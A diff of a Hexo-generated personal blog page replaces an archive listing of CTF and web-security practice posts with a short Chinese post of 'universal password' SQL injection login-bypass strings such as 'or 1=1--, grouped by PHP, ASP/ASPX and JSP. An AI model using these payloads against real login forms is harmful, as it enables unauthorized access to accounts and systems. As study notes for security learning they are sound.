@@ -26,7 +26,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>archives- 2020/11 - Hexo</title>
+<title>万能密码总结 - Hexo</title>
 
 <meta name="keywords" content="">
 
@@ -114,8 +114,18 @@
 
             <div class="page-title">
     <ul>
-        <li><a href="/" data-name="Home" title="Back Home">Home</a></li>
-        <li><a href="/tags" data-name="Tag Cloud" title="Tag Cloud">Tags</a></li>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
         <li class="page-search">
     <form id="search" class="search-form">
         <input type="text"
@@ -131,159 +141,64 @@
 <div class="main-inner">
     <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
         <div class="post-header">
-            <h3 class="post-title">Nice 🥳 14 posts in total. Keep on posting.</h3>
-        </div>
-        
-
-        <div class="post-content markdown-body" itemprop="articleBody">
-            <div class="archives">
-                
-                
-                
-                
-                
-                <div class="archives-item">
-                    <h2>2021年01月</h2>
-                    <ul class="archives_list">
-                        
-                        <li>18日18:57:45
-                            <a href="/note3/undefined-undefined.html">万能密码总结</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>18日18:16:51
-                            <a href="/test7/undefined-undefined.html">寒假练习4</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>17日22:56:15
-                            <a href="/test7/undefined-undefined.html">sql注入闯关1</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>17日14:36:42
-                            <a href="/test6/undefined-undefined.html">寒假练习3</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>16日16:51:35
-                            <a href="/test5/undefined-undefined.html">寒假练习2</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>15日15:35:37
-                            <a href="/test4/undefined-undefined.html">寒假练习1</a>
-                            
-                        </li>
-                        
-                    </ul>
-                </div>
-                
-                
-                
-                
-                
-                <div class="archives-item">
-                    <h2>2020年12月</h2>
-                    <ul class="archives_list">
-                        
-                        <li>05日22:25:22
-                            <a href="/test3/undefined-undefined.html">web第二周练习ssrf1</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>03日18:33:24
-                            <a href="/test2/undefined-undefined.html">第二周习题1</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>02日23:12:18
-                            <a href="/test1/undefined-undefined.html">攻防世界练习---伪协议</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>02日21:52:25
-                            <a href="/note2/undefined-undefined.html">PHP伪协议笔记</a>
-                            
-                        </li>
-                        
-                    </ul>
-                </div>
-                
-                
-                
-                
-                
-                <div class="archives-item">
-                    <h2>2020年11月</h2>
-                    <ul class="archives_list">
-                        
-                        <li>29日15:49:38
-                            <a href="/note1/undefined-undefined.html">PHP中foreach函数笔记</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>28日22:41:48
-                            <a href="/note/undefined-undefined.html">第一周学习报告</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>28日16:42:13
-                            <a href="/test/undefined-undefined.html">web第一周练习</a>
-                            
-                        </li>
-                        
-                
-                
-                
-                        <li>22日20:45:37
-                            <a href="/%E7%BB%83%E4%B9%A0/undefined-undefined.html">web习题练习1</a>
-                            
-                        </li>
-                        
-                    </ul>
-                </div>
-                
-                
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-01-18">2021-01-18</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">万能密码总结</h2>
+            <div class="post-meta">
+                emm... 438 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
             </div>
         </div>
+        <div class="post-content markdown-body">
+            <p>将从网上查到的一些sql注入的万能密码记录下来，以便以后使用。  </p>
+<h1 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h1><p>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–  </p>
+<h1 id="asp-aspx语言"><a href="#asp-aspx语言" class="headerlink" title="asp aspx语言"></a>asp aspx语言</h1><p>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’  </p>
+<h1 id="jsp语言"><a href="#jsp语言" class="headerlink" title="jsp语言"></a>jsp语言</h1><p>1’or’1’=’1<br>admin’ or 1=1/*  </p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
+            
+        </div>
+        
     </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
 </div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
